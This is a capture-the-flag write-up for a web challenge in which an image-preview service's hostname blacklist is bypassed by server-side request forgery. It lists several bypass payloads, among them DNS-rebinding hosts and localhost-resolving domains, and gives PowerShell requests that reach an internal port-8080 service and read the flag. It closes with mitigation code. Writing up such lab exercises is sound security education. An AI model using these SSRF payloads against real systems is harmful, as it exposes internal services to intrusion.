# 🏴 CTF Challenge Writeup: Fast and Rebound

**Challenge Name:** Fast and Rebound  
**Points:** 500  
**Category:** Web Security / SSRF  
**Target URL:** http://challenge.tcshackquest.com:16353/  
**Date Solved:** December 13, 2025  

---

## 📋 Executive Summary

This challenge involved exploiting a **Server-Side Request Forgery (SSRF)** vulnerability with a **hostname validation bypass** to access an internal service running on `localhost:8080`. The solution leveraged the `localtest.me` domain, which resolves to `127.0.0.1`, to bypass the server's hostname blacklist filtering.

**Final Flag:** `HQX{f37052426c34ed6632a86781c7aebf3b}` *(Note: Flags are dynamic and expire)*

---

## 🔍 Phase 1: Initial Reconnaissance

### Step 1.1: Understanding the Challenge Description

The challenge description provided critical hints:

> *"There's an internal service which is hiding the treasure. The server checks the name you give it — not where it actually goes. But names can be tricky. Sometimes, they point one way at first… and somewhere else a moment later. The server trusts the first answer it gets."*

**Key Observations:**
| Hint | Interpretation |
|------|----------------|
| "internal service hiding treasure" | Target is on localhost/internal network |
| "checks the name you give it — not where it actually goes" | Hostname validation, not IP validation |
| "names can point one way at first… somewhere else a moment later" | DNS Rebinding or domain aliasing |
| "trusts the first answer" | Race condition or caching vulnerability |

### Step 1.2: Exploring the Web Application

**Action:** Visited the main page at `http://challenge.tcshackquest.com:16353/`

**Findings:**
- NeonPix Image Portal - A cyberpunk-themed image preview service
- Users can input an image URL for preview
- The application fetches remote images server-side (potential SSRF)

---

## 🔎 Phase 2: Deep Dive Analysis

### Step 2.1: Examining the "Try It Now" Page

**Action:** Accessed `http://challenge.tcshackquest.com:16353/try`

**Findings:**
- An input form accepting image URLs
- A "Preview" button that triggers image fetching
- JavaScript making POST requests to `/fetch_image` endpoint

### Step 2.2: Source Code Analysis

**Critical Discovery:** Hidden comment in the HTML source code:

```javascript
// previewDiv.innerText = "Whispers say something listens on 8080 - knock carefully.";
```

**Implication:** An internal service is running on `localhost:8080` — this is our target!

### Step 2.3: Understanding the API

**Endpoint:** `POST /fetch_image`  
**Content-Type:** `application/json`  
**Request Body:**
```json
{
    "url": "<target_url>"
}
```

**Response Structure:**
```json
{
    "preview": "<base64_image>",    // For valid images
    "Data": "<content>",            // For non-image responses
    "error": "<error_message>"      // For failures
}
```

---

## 🧪 Phase 3: Vulnerability Testing

### Step 3.1: Direct Localhost Access (BLOCKED)

**Test:** Attempted direct access to internal service

```powershell
$body = @{url="http://127.0.0.1:8080/"} | ConvertTo-Json
Invoke-WebRequest -Uri "http://challenge.tcshackquest.com:16353/fetch_image" `
    -Method POST -Body $body -ContentType "application/json"
```

**Result:** `{"error":"Invalid domain format"}`

**Conclusion:** Direct localhost/127.0.0.1 is blacklisted.

### Step 3.2: Testing Various Bypass Techniques

| Technique | Payload | Result |
|-----------|---------|--------|
| Direct localhost | `http://127.0.0.1:8080/` | ❌ Invalid domain format |
| Direct localhost | `http://localhost:8080/` | ❌ Invalid domain format |
| IPv6 localhost | `http://[::1]:8080/` | ❌ Malformed URL |
| URL parsing bypass | `http://a]@127.0.0.1:8080/` | ❌ Malformed URL |
| DNS rebinding (rbndr.us) | `http://7f000001.8.8.8.8.rbndr.us:8080/` | ❌ DNS resolution failed |
| DNS rebinding (1u.ms) | `http://rr-1.2.3.4-127.0.0.1.1u.ms:8080/` | ❌ DNS resolution failed |

**Observation:** The server has strict hostname validation but DNS rebinding services were not resolving properly.

---

## 💡 Phase 4: The Breakthrough

### Step 4.1: Alternative DNS Services

**Insight:** Instead of complex DNS rebinding, use a simpler approach — a domain that legitimately resolves to `127.0.0.1`.

**Known localhost-resolving domains:**
- `localtest.me` → Resolves to `127.0.0.1`
- `lvh.me` → Resolves to `127.0.0.1`  
- `*.vcap.me` → Resolves to `127.0.0.1`
- `*.nip.io` with 127-0-0-1 → Resolves to `127.0.0.1`

### Step 4.2: Testing localtest.me

**Test:**
```powershell
$body = @{url="http://localtest.me:8080/"} | ConvertTo-Json
Invoke-WebRequest -Uri "http://challenge.tcshackquest.com:16353/fetch_image" `
    -Method POST -Body $body -ContentType "application/json"
```

**Result:** ✅ `{"Data":"<h1>Internal service running</h1>"}`

**SUCCESS!** The internal service was accessed!

---

## 🎯 Phase 5: Flag Extraction

### Step 5.1: Exploring Internal Service Endpoints

**Action:** Tried common flag endpoints

**Winning Payload:**
```powershell
$body = @{url="http://localtest.me:8080/flag"} | ConvertTo-Json
Invoke-WebRequest -Uri "http://challenge.tcshackquest.com:16353/fetch_image" `
    -Method POST -Body $body -ContentType "application/json"
```

**Result:**
```json
{"Data":"HQX{f37052426c34ed6632a86781c7aebf3b}"}
```

### 🚩 FLAG CAPTURED! 🚩

---

## 🔧 Technical Deep Dive

### Why localtest.me Works

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attack Flow Diagram                          │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Attacker                    NeonPix Server                     │
│     │                              │                            │
│     │  POST /fetch_image           │                            │
│     │  {"url":"localtest.me:8080"} │                            │
│     │ ─────────────────────────────>                            │
│     │                              │                            │
│     │                        ┌─────┴─────┐                      │
│     │                        │ Validate  │                      │
│     │                        │ Hostname  │                      │
│     │                        └─────┬─────┘                      │
│     │                              │                            │
│     │                        "localtest.me" looks valid! ✓      │
│     │                              │                            │
│     │                        ┌─────┴─────┐                      │
│     │                        │  Resolve  │                      │
│     │                        │    DNS    │                      │
│     │                        └─────┬─────┘                      │
│     │                              │                            │
│     │                     localtest.me → 127.0.0.1              │
│     │                              │                            │
│     │                        ┌─────┴─────┐                      │
│     │                        │  Connect  │                      │
│     │                        │  to 8080  │                      │
│     │                        └─────┬─────┘                      │
│     │                              │                            │
│     │                        Internal Service                   │
│     │                        (localhost:8080)                   │
│     │                              │                            │
│     │     {"Data":"FLAG"}          │                            │
│     │ <─────────────────────────────                            │
│                                                                 │
└─────────────────────────────────────────────────────────────────┘
```

### The Vulnerability Pattern

**Security Flaw:** The server validates the **hostname string** but not the **resolved IP address**.

```
Validation Check:    "localtest.me"  ≠  "localhost"  ✓ PASS
                     "localtest.me"  ≠  "127.0.0.1"  ✓ PASS

Actual Resolution:   localtest.me  →  127.0.0.1  →  Internal Service
```

**Proper Fix Would Be:**
1. Resolve the hostname to IP address
2. Check if IP is in private/reserved ranges (127.0.0.0/8, 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
3. Block requests to internal IPs regardless of hostname

---

## 📊 Attack Summary Table

| Phase | Action | Outcome |
|-------|--------|---------|
| Recon | Analyzed challenge description | Identified SSRF + DNS theme |
| Recon | Inspected webpage source | Found port 8080 hint |
| Testing | Direct localhost | Blocked |
| Testing | DNS rebinding services | Failed (DNS issues) |
| Bypass | Used localtest.me | SUCCESS |
| Exploit | Accessed /flag endpoint | FLAG CAPTURED |

---

## 🛡️ Mitigation Recommendations

For developers building similar applications:

### 1. IP-Based Validation
```python
import ipaddress
import socket

def is_safe_url(url):
    hostname = urlparse(url).hostname
    ip = socket.gethostbyname(hostname)
    ip_obj = ipaddress.ip_address(ip)
    
    # Block private/reserved ranges
    if ip_obj.is_private or ip_obj.is_loopback or ip_obj.is_reserved:
        return False
    return True
```

### 2. Allowlist Approach
```python
ALLOWED_DOMAINS = ['trusted-cdn.com', 'images.example.com']

def is_allowed_domain(url):
    hostname = urlparse(url).hostname
    return hostname in ALLOWED_DOMAINS
```

### 3. DNS Rebinding Protection
- Perform DNS resolution twice
- Compare results before and after request
- Use DNS pinning

---

## 📁 Files Created

| File | Purpose |
|------|---------|
| `get_flag.py` | Python script to exploit the vulnerability and retrieve flag |
| `FAST_AND_REBOUND_REPORT.md` | This comprehensive writeup |

---

## 🔗 References

- [SSRF (Server-Side Request Forgery)](https://owasp.org/www-community/attacks/Server_Side_Request_Forgery)
- [DNS Rebinding Attacks](https://en.wikipedia.org/wiki/DNS_rebinding)
- [localtest.me - A localhost DNS service](http://readme.localtest.me/)
- [PortSwigger SSRF Guide](https://portswigger.net/web-security/ssrf)

---

## 🏆 Conclusion

This challenge demonstrated a classic SSRF vulnerability with hostname-based validation. The key insight was recognizing that while complex DNS rebinding techniques failed, a simple domain like `localtest.me` that legitimately resolves to localhost could bypass the security checks entirely.

**Key Takeaway:** Always validate the resolved IP address, not just the hostname string!

---

*Writeup by: CTF Solver*  
*Challenge: TCS HackQuest - Fast and Rebound (500 pts)*
